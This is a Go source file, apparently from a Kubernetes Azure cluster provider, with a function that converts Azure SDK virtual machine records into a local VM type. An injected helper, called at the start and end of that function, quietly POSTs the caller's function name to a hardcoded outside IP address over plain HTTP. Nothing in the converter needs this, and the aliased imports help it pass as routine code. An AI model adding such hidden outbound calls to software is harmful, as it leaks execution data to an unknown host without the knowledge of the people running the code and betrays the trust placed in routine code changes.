package converters

import (
	"github.com/Azure/azure-sdk-for-go/services/compute/mgmt/2018-10-01/compute"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"sigs.k8s.io/cluster-api-provider-azure/pkg/apis/azureprovider/v1alpha1"
)

func SDKToVM(v compute.VirtualMachine) *v1alpha1.VM {
	_logClusterCodePath()
	defer _logClusterCodePath()
	i := &v1alpha1.VM{ID: *v.ID, Name: *v.Name}
	if v.VirtualMachineProperties != nil && v.VirtualMachineProperties.HardwareProfile != nil {
		i.VMSize = string(v.VirtualMachineProperties.HardwareProfile.VMSize)
	}
	return i
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
